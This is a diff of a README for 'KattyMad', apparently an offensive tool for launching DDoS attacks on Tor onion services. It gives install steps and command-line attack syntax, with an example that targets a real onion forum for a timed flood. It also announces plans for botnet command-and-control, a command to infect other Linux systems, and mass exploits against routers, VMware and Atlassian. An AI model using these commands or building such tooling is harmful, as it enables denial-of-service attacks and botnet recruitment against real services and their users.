@@ -1,18 +1,9 @@
 # Kattymad
 # v1.1
-
-## Edit 23/06:
-About now the Beta version with auto-deployer, C2C with a dedicated socket (not in SSH to avoid disconnections during broadcasting) and a multitor demo version of "Jumping Circuits and Overconnects" attack is available privatelly.<br>
-I will push here when it will be tested enough. Thanks.<br>
-
-
 KattyMad is a tool designed to install and perform DDoS attacks over the onion protocol.  <br>
 I started from a fork of "KARMA" but it was literally unmaintaned and was using old cookies concept and also network stack was performing worstly than expected.
-<br><br>
 So i started again and this time i found very useful the MHDDoS project. <br>
-Im constantly editing this project because the aim is to create mass environments that can easily takeover onion networks.<br><br>
-
-<br><br>
+Im constantly editing this project because the aim is to create mass environments that can easily takeover onion networks.
 Please, read the [TODO](TODO.txt) and help me.
 
 (NB. Credits binary code is just a reverse from ascii common text)<br>
@@ -25,37 +16,33 @@ You must use Python 3.9 or higher
 
 Step:
 ```
-git clone https://github.com/electr0lulz/kattymad.git
+git clone https://github.com/electr0lulz/kattymad
+cd kattymad
+sudo ./setup.sh
 ```
-#Install Python3 modules
+## Example
 ```
-cd ~/kattymad/ddos/
-pip3 install -r requirements.txt
-sudo apt-get install -y golang-go
-mkdir bombardier_tmp
-cd bombardier_tmp
-go mod init bombardier_tmp
-go mod edit -replace github.com/codesenberg/bombardier=github.com/PXEiYyMH8F/bombardier@78-add-proxy-support
-go get github.com/codesenberg/bombardier
-cd ..
-rm -r bombardier_tmp
-```
-or
-```
-pip install -r requirements.txt
-```
-#Install Chrome (or update it lastest version)
-```
-cd resources; wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
-sudo apt-get install ./resources/google-chrome-stable_current_amd64.deb
-```
-## EASYBUSY CAT?
-```
-cd ~/kattymad/ddos/; python3 setup.py
-## Install Anonsurf through setup.sh or by yourself and get ready ##
+Use DDoS Panel   : python3 kitty.py
+Use command line : python3 kitty.py <method> <target> <thread> <time>
 ```
 
+## Pratical Usage on onion services ##
+ATM: best methods are stomp+cookies+slow (and connections) i will include here a script call ddos.sh that require only URL+TIMING args.
+```
+syntax:
+python3 katty.py cookie $1 0 256 proxy.txt $PORT $2
+example:
+python3 katty.py stomp http://cryptbbtg65gibadeeo2awe3j7s6evg7eklserehqr4w4e2bis5tebid.onion/ 0 64 proxy.txt 256 1800 debug
+or
+./ddos http://cryptbbtg65gibadeeo2awe3j7s6evg7eklserehqr4w4e2bis5tebid.onion/ 60 ##### it means 60 seconds ddos on url of cryptbbtg65gibadeeo2awe3j7s6evg7eklserehqr4w4e2bis5tebid.onion.
+```
+Where $PORT is a variable editable into your ddos.sh file, usually 80 is the best option. $1 is the url, and $2 is the timing.
+About now it's automatically setted up on 256 threads. (connections don't require anything else)
+CryptBB is just an onion example. Use your favorite onion url.
+
+Soon i will remove all unused methods from previous forked version, also, you will be able to access to the C2C management where you can add all your katty servers and start attacks with a everyshell together.
+Also will be a very nice WebDashboard (about now is wrote in PHP, but soon will be ported in golang) where you can manage your C2C, your bots without needs to open shell, have a very easy command to infect other linux-based systems and a web-exploitter based on realtek, dlink and other shitty-router platform (including some mass-exploit made by me for vmware and atlassian) allowing you to have a botnet very quickly.
+Very soon multitor version and captcha bypass will be added, even if we are found a lot of problems in solving the dread-based-captcha.
 ##
 See you around.
 [Electr0lulz](https://github.com/electr0lulz/)
-##
